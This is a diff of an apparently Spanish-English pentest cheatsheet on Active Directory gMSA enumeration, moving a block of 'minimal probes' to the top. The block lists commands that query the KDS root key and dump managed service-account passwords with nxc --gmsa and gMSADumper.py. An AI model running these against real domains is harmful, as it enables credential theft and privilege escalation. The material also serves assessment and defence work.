@@ -34,7 +34,48 @@ linked:
 
 ## Cheatsheet
 
-### 🔍 gMSA Discovery
+### 1. Recon Rápido (Probes)
+
+#### Probes mínimos
+
+```bash
+DC="dc01.dom.local"
+USER="user"; PASS="pass"
+
+# 1. Schema check
+Get-ADObject -SearchBase "CN=Schema,..." `
+  -Filter "Name -like '*group-managed-service-account*'" |
+  Select Name
+
+# 2. KDS Root Key
+Get-KdsRootKey
+
+# 3. gMSA discovery
+Get-ADServiceAccount -Filter * | Select Name,SamAccountName
+
+# 4. Bulk dump
+nxc ldap $DC -u $USER -p $PASS --gmsa
+
+# 5. Privileged gMSAs
+Get-ADServiceAccount -Filter * -Properties MemberOf |
+  Where {$_.MemberOf -match "Domain Admins|Enterprise Admins"}
+
+# 6. Authenticated Users with read (CRITICAL)
+Get-ADServiceAccount -Filter * `
+  -Properties PrincipalsAllowedToRetrieveManagedPassword |
+  Where {
+    $_.PrincipalsAllowedToRetrieveManagedPassword -match "Authenticated Users|Domain Users"
+  }
+
+# 7. Linux gMSADumper
+python3 gMSADumper.py -u $USER -p $PASS -d dom.local
+```
+
+---
+
+### 2. Enumeración
+
+#### 🔍 gMSA Discovery
 
 ````tabs
 tab: **Schema Detection**
@@ -59,7 +100,7 @@ tab: **Forest-Wide gMSA**
 ![[AD - gMSA Enumeration - gMSA Discovery#^ad-gmsa-multidomain]]
 ````
 
-### 🔑 Password Read Permissions
+#### 🔑 Password Read Permissions
 
 ````tabs
 tab: **msDS-GroupMSAMembership**
@@ -84,7 +125,7 @@ tab: **Common Misconfigurations**
 ![[AD - gMSA Enumeration - Password Read Permissions#^ad-gmsa-perm-misconfig]]
 ````
 
-### 💉 gMSA Password Dump
+#### 💉 gMSA Password Dump
 
 ````tabs
 tab: **msDS-ManagedPassword Blob**
@@ -109,7 +150,7 @@ tab: **Pivot Post-Dump**
 ![[AD - gMSA Enumeration - gMSA Password Dump#^ad-gmsadump-pivot]]
 ````
 
-### 📋 sMSA & dMSA
+#### 📋 sMSA & dMSA
 
 ````tabs
 tab: **sMSA (Standalone)**
@@ -131,7 +172,7 @@ tab: **Cross-Correlate with Hosts**
 ![[AD - gMSA Enumeration - sMSA y dMSA#^ad-msa-correlate]]
 ````
 
-### 🎯 Privileged gMSA Identification
+#### 🎯 Privileged gMSA Identification
 
 ````tabs
 tab: **gMSA in Privileged Groups**
@@ -153,7 +194,7 @@ tab: **High-Value Summary**
 ![[AD - gMSA Enumeration - Privileged gMSA Identification#^ad-gmsapriv-summary]]
 ````
 
-### 🛠️ Tooling
+#### 🛠️ Tooling
 
 ````tabs
 tab: **netexec / crackmapexec**
@@ -273,45 +314,6 @@ LAPSv1/v2 = local admin password mgmt. gMSA = service account password mgmt. Bot
    - Bulk Kerberos TGS for gMSA SPNs
    - KDS Root Key access (GoldenGMSA)
    - msDS-ManagedPassword read events
-```
-
----
-
-## Detección rápida
-
-### Probes mínimos
-
-```bash
-DC="dc01.dom.local"
-USER="user"; PASS="pass"
-
-# 1. Schema check
-Get-ADObject -SearchBase "CN=Schema,..." `
-  -Filter "Name -like '*group-managed-service-account*'" |
-  Select Name
-
-# 2. KDS Root Key
-Get-KdsRootKey
-
-# 3. gMSA discovery
-Get-ADServiceAccount -Filter * | Select Name,SamAccountName
-
-# 4. Bulk dump
-nxc ldap $DC -u $USER -p $PASS --gmsa
-
-# 5. Privileged gMSAs
-Get-ADServiceAccount -Filter * -Properties MemberOf |
-  Where {$_.MemberOf -match "Domain Admins|Enterprise Admins"}
-
-# 6. Authenticated Users with read (CRITICAL)
-Get-ADServiceAccount -Filter * `
-  -Properties PrincipalsAllowedToRetrieveManagedPassword |
-  Where {
-    $_.PrincipalsAllowedToRetrieveManagedPassword -match "Authenticated Users|Domain Users"
-  }
-
-# 7. Linux gMSADumper
-python3 gMSADumper.py -u $USER -p $PASS -d dom.local
 ```
 
 ---
